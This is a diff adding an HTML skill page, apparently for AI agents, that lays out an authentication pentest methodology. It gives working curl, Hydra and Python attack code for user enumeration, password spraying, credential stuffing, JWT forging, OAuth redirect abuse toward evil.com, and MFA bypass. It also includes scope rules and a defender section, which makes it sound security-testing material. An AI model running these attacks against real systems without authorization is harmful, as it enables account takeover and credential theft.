@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: auth-attacks</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>auth-attacks</h2><div class="meta"><span class="badge gray">auth</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing authentication on an authorized engagement.</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="password-attacks.html">password-attacks</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Hydra</td><td>9.5</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Authentication attacks target the login and session layer: guessing who exists, guessing their secrets, abusing how sessions are issued, and breaking token or single sign-on logic. This skill covers the authorized methodology for each, with strict scope discipline. Credential stuffing and MFA bypass work is done only with credentials and accounts the client explicitly provided for testing, never with real user data or third party breach dumps.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Map the login surface: forms, APIs, SSO buttons, password reset,</li>
+<p>registration, and mobile endpoints.</p>
+<li>Test user enumeration through response differences, timing, and</li>
+<p>reset flows.</p>
+<li>Test rate limiting and lockout with a small number of deliberate</li>
+<p>attempts before any larger run.</p>
+<li>Run password spraying and targeted brute force inside the agreed</li>
+<p>attempt limits.</p>
+<li>Test session handling: fixation, cookie flags, timeout, and logout.</li>
+<li>Attack JWTs: algorithm confusion, weak secrets, and claim tampering.</li>
+<li>Attack OAuth/OIDC: redirect URI abuse, code leakage, and state issues.</li>
+<li>Test MFA only on provided test accounts, within the agreed bypass</li>
+<p>scope.</p>
+<li>Log every attempt count and timestamp so the client can correlate</li>
+<p>with their logs.</p>
+</ol>
+<h2>1. User enumeration</h2>
+<p>Find out which usernames exist before guessing passwords.</p>
+<pre><code class="language-bash"># Compare login responses for valid vs invalid users
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;:&quot;realuser&quot;,&quot;pass&quot;:&quot;wrong&quot;}&#x27; | head -c 200
+curl -s -X POST &#x27;https://target.example/api/login&#x27; \
+  -H &#x27;Content-Type: application/json&#x27; \
+  -d &#x27;{&quot;user&quot;:&quot;nouser99999&quot;,&quot;pass&quot;:&quot;wrong&quot;}&#x27; | head -c 200
+
+# Timing probe: some apps hash only for existing users (slower response)
+for u in realuser nouser99999; do
+  time curl -s -o /dev/null -X POST &#x27;https://target.example/api/login&#x27; \
+    -d &quot;{\&quot;user\&quot;:\&quot;$u\&quot;,\&quot;pass\&quot;:\&quot;wrong\&quot;}&quot;
+done
+
+# Password reset enumeration
+curl -s -X POST &#x27;https://target.example/reset&#x27; -d &quot;email=real@example.com&quot;
+curl -s -X POST &#x27;https://target.example/reset&#x27; -d &quot;email=nope@example.com&quot;</code></pre>
+<p>Also check registration (&quot;username taken&quot;), contact forms, and verbose API error codes. Record every oracle; enumeration alone is a finding.</p>
+<h2>2. Brute force and password spraying</h2>
+<p>Confirm lockout and rate limit behavior with a handful of attempts first, then run inside the agreed limits.</p>
+<pre><code class="language-bash"># Hydra against a form login (small, polite run)
+hydra -l admin -P /tmp/candidates.txt target.example https-post-form \
+  &quot;/login:user=^USER^&amp;pass=^PASS^:F=Invalid&quot; -t 2 -w 5
+
+# Password spraying: one common password across many users (low noise)
+hydra -L /tmp/users.txt -p &#x27;Winter2026!&#x27; target.example https-post-form \
+  &quot;/login:user=^USER^&amp;pass=^PASS^:F=Invalid&quot; -t 1 -W 10
+
+# Check for missing rate limiting with a quick loop and watch for blocks
+for i in $(seq 1 20); do
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; -X POST \
+    &#x27;https://target.example/api/login&#x27; -d &#x27;{&quot;user&quot;:&quot;admin&quot;,&quot;pass&quot;:&quot;x&quot;}&#x27;)
+  echo &quot;attempt $i -&gt; $code&quot;
+done</code></pre>
+<p>Rules: never exceed the agreed attempts per account, stop at the first lockout signal, prefer spraying (few attempts per user, many users) over hammering one account, and avoid production hours unless agreed.</p>
+<h2>3. Credential stuffing (authorized scope only)</h2>
+<p>Credential stuffing replays username/password pairs from other breaches. Only do this with a credential set the client provided (for example their own test accounts), never with real breach compilations against real users.</p>
+<pre><code class="language-bash"># Format: user:pass per line, from the client&#x27;s provided test set
+hydra -C /tmp/client_test_creds.txt target.example https-post-form \
+  &quot;/login:user=^USER^&amp;pass=^PASS^:F=Invalid&quot; -t 2 -w 10
+
+# Detect password reuse signal without locking accounts:
+# stop the run on first success per user and throttle between attempts</code></pre>
+<p>If the client wants real-world exposure measured, recommend they run their own users&#x27; hashes against breach corpora internally instead of you testing live logins.</p>
+<h2>4. Session fixation and session handling</h2>
+<p>Test whether the application lets an attacker fix a victim&#x27;s session ID.</p>
+<pre><code class="language-bash"># 1. Get a session ID before login
+curl -s -c /tmp/pre.txt &#x27;https://target.example/login&#x27; -o /dev/null
+PRE=$(grep -i session /tmp/pre.txt | awk &#x27;{print $NF}&#x27;)
+
+# 2. Log in with that cookie jar and see if the ID survives login
+curl -s -b /tmp/pre.txt -c /tmp/post.txt -X POST \
+  &#x27;https://target.example/login&#x27; -d &quot;user=test&amp;pass=Test123!&quot;
+diff /tmp/pre.txt /tmp/post.txt
+
+# 3. If the ID is unchanged after login, fixation is possible:
+#    the attacker sets this ID in the victim&#x27;s browser before they log in.</code></pre>
+<pre><code class="language-bash"># Cookie flag and lifetime checks
+curl -sI &#x27;https://target.example/&#x27; | grep -i &#x27;set-cookie&#x27;
+# Look for: Secure, HttpOnly, SameSite=Lax|Strict, reasonable Max-Age
+
+# Logout must invalidate server side: reuse the old cookie after logout
+curl -s -b /tmp/post.txt &#x27;https://target.example/account&#x27; -o /dev/null -w &#x27;%{http_code}\n&#x27;</code></pre>
+<p>Also test concurrent session behavior, session timeout on idle, and whether password change kills other sessions.</p>
+<h2>5. JWT attacks</h2>
+<p>Decode the token, read the header, and test each classic weakness.</p>
+<pre><code class="language-bash"># Decode header and payload (no verification, just base64)
+TOKEN=&quot;eyJhbGciOiJIUzI1NiIs...&quot;
+echo &quot;$TOKEN&quot; | cut -d. -f1 | base64 -d 2&gt;/dev/null; echo
+echo &quot;$TOKEN&quot; | cut -d. -f2 | base64 -d 2&gt;/dev/null; echo</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;JWT weakness checks: none-alg, weak secret, kid traversal (lab use).&quot;&quot;&quot;
+import base64, json, hmac, hashlib, sys
+
+def b64d(s):
+    return base64.urlsafe_b64decode(s + &quot;=&quot; * (-len(s) % 4))
+
+def b64e(b):
+    return base64.urlsafe_b64encode(b).decode().rstrip(&quot;=&quot;)
+
+token = sys.argv[1].strip()
+header_b, payload_b, sig = token.split(&quot;.&quot;)
+header = json.loads(b64d(header_b))
+payload = json.loads(b64d(payload_b))
+print(&quot;[*] alg:&quot;, header.get(&quot;alg&quot;), &quot;| kid:&quot;, header.get(&quot;kid&quot;))
+
+# 1. none algorithm variant
+none_token = b64e(json.dumps({&quot;alg&quot;: &quot;none&quot;, &quot;typ&quot;: &quot;JWT&quot;}).encode()) \
+    + &quot;.&quot; + b64e(json.dumps(payload).encode()) + &quot;.&quot;
+print(&quot;[*] none-alg token:&quot;, none_token)
+
+# 2. weak secret brute force (small demo list; use bigger lists in scope)
+for secret in [&quot;secret&quot;, &quot;password&quot;, &quot;123456&quot;, &quot;target&quot;, &quot;jwt&quot;]:
+    calc = b64e(hmac.new(secret.encode(), f&quot;{header_b}.{payload_b}&quot;.encode(),
+                          hashlib.sha256).digest())
+    if hmac.compare_digest(calc, sig):
+        print(&quot;[!] weak secret found:&quot;, secret)
+        break
+
+# 3. tamper a claim (e.g. role) keeping the original signature,
+#    to see if the server skips verification
+payload[&quot;role&quot;] = &quot;admin&quot;
+tampered = b64e(json.dumps(payload).encode())
+print(&quot;[*] tampered payload (same sig):&quot;, header_b + &quot;.&quot; + tampered + &quot;.&quot; + sig)</code></pre>
+<p>Test each crafted token against an authenticated endpoint and watch for 200 vs 401. Also check: missing <code>exp</code>, overly long lifetime, <code>jku</code>/<code>x5u</code> header pointing at attacker URLs, and <code>kid</code> values vulnerable to path traversal or SQL injection.</p>
+<h2>6. OAuth and OpenID Connect flaws</h2>
+<p>Map the flow first: authorization endpoint, token endpoint, redirect URIs, and scopes.</p>
+<pre><code class="language-bash"># Start a normal flow and capture the authorize URL
+curl -s &#x27;https://target.example/oauth/authorize?client_id=webapp&amp;response_type=code&amp;redirect_uri=https://target.example/cb&amp;scope=openid&amp;state=abc123&#x27; -D - -o /dev/null | grep -i location
+
+# Redirect URI tests: try open redirectors, subdomains, path tricks
+# https://target.example/cb.evil.com
+# https://target.example/cb?next=https://evil.com
+# https://target.example%2fcb@evil.com  (parser differentials)
+
+# Check state parameter: remove it and see if the flow still completes</code></pre>
+<p>Key tests: authorization code leaked in referer or logs, <code>code</code> reusable (no single use), missing or static <code>state</code> (CSRF on login), implicit flow still enabled (<code>response_type=token</code> leaking tokens in the URL fragment), overly broad scopes granted by default, and token endpoint without <code>client_secret</code> validation for confidential clients. Test with two of your own test accounts to check cross-account code redemption.</p>
+<h2>7. MFA bypass techniques (authorized scope, test accounts only)</h2>
+<p>Only against accounts the client gave you, and only bypass classes in the agreed scope.</p>
+<pre><code class="language-bash"># Check whether the MFA step can be skipped by direct navigation
+curl -s -b /tmp/premfa.txt &#x27;https://target.example/account&#x27; -w &#x27;%{http_code}\n&#x27;
+
+# Test OTP brute force space and rate limiting (6 digits = 1M space)
+for code in 000000 111111 123456; do
+  curl -s -X POST &#x27;https://target.example/mfa/verify&#x27; \
+    -b /tmp/premfa.txt -d &quot;code=$code&quot; | head -c 120; echo
+done
+
+# Response manipulation: some apps accept {&quot;success&quot;:true} client side,
+# or treat a missing mfa cookie as verified</code></pre>
+<p>Also test: OTP reuse after one use, overly long OTP validity, MFA reset flows that fall back to email only, &quot;remember this device&quot; tokens that never expire, and push-based MFA for missing number matching. Document every bypass with the exact request that skipped the check.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Account lockout triggers after 5 attempts. Stop immediately, note the</li>
+<p>threshold, and switch to spraying with wider user lists and longer delays.</p>
+<li>CAPTCHA appears after a few attempts. Do not bypass it; report the</li>
+<p>control as working and test the API endpoint directly if it lacks the CAPTCHA.</p>
+<li>JWT uses RS256 but the server accepts HS256 with the public key as the</li>
+<p>HMAC secret. Fetch <code>/.well-known/jwks.json</code> or the public key file and test the confusion explicitly.</p>
+<li>OAuth <code>state</code> is validated but predictable. Predictable is as good as</li>
+<p>missing for login CSRF; prove it by fixing a victim flow with your own state value.</p>
+<li>Session ID rotates on login but the old ID stays valid server side.</li>
+<p>Rotation without invalidation is still fixation-adjacent; prove the old ID works after login.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>No enumeration oracle on login: pivot to reset, register, and support</li>
+<p>endpoints, then to timing attacks with more samples per user.</p>
+<li>Spraying finds nothing with common passwords: try seasonal and company</li>
+<p>specific patterns (company name plus year) within the attempt budget.</p>
+<li>JWT secret resists a small list: move to hashcat mode 16500 with a</li>
+<p>larger wordlist (see the password-attacks skill) if scope allows offline cracking.</p>
+<li>OAuth redirect validation looks strict: test parser differentials</li>
+<p>(trailing dots, URL-encoded slashes, <code>@</code> userinfo tricks) one at a time.</p>
+<li>MFA cannot be bypassed directly: check the recovery and enrollment</li>
+<p>flows, which are often weaker than the verify step.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see authentication attacks as bursts of failed logins from few IPs, many usernames tried from one IP (spraying), login attempts at odd hours, session IDs that never rotate, and JWTs with <code>alg: none</code> or tampered claims in API logs. Good defenses are rate limiting plus progressive delays, lockout with alerting, MFA enforced server side on every sensitive action, short-lived tokens with rotation, strict redirect URI allowlists, and <code>state</code> plus PKCE on every OAuth flow.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1110.001 (Brute Force: Password Guessing), T1110.003</li>
+<p>(Password Spraying), T1110.004 (Credential Stuffing), T1110.002 (Password Cracking).</p>
+<li>MITRE ATT&amp;CK T1550.001 (Use Alternate Authentication Material:</li>
+<p>Application Access Token).</p>
+<li>MITRE ATT&amp;CK T1621 (Multi-Factor Authentication Request Generation).</li>
+<li>CWE-287 (Improper Authentication), CWE-307 (Improper Restriction of</li>
+<p>Excessive Authentication Attempts).</p>
+<li>CWE-384 (Session Fixation), CWE-798 (Use of Hard-coded Credentials).</li>
+<li>CWE-598 (Use of GET Request Method With Sensitive Query Strings):</li>
+<p>tokens in URLs.</p>
+<li>OWASP Testing Guide: Authentication Testing (OTG-AUTHN) and Session</li>
+<p>Management (OTG-SESS).</p>
+<li>RFC 8725 (JWT best practices), RFC 6749 (OAuth 2.0).</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
